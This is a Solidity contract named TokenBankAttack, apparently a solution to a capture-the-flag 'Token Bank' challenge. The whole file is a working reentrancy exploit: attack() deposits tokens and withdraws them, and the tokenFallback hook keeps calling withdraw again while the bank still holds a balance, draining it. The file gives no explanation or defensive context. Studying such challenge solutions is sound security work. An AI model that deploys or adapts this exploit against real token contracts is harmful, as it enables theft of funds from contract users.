// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface ISimpleERC223Token {
    function balanceOf(address user) external view returns (uint);
    function transfer(address to, uint256 value) external returns (bool success);
}
interface ITokenBankChallenge {
    function isComplete() external view returns (bool);
    function withdraw(uint256 amount) external;
    function token() external returns (address);
}

contract TokenBankAttack {
    ITokenBankChallenge public bank;
    ISimpleERC223Token public token;
    address player;
    constructor(address _bank) {
        bank = ITokenBankChallenge(_bank);
        token = ISimpleERC223Token(bank.token());
        player = msg.sender;
    }
    function attack() external {
        uint value = token.balanceOf(address(this));
        require(value != 0, "Can't attack without token");
        token.transfer(address(bank), value);
        bank.withdraw(value);
    }
    function tokenFallback(address from, uint256 value, bytes calldata) external {
        if (from == player) {
            return;
        }
        if (token.balanceOf(address(bank)) > 0) {
            bank.withdraw(value);
        }
    }
}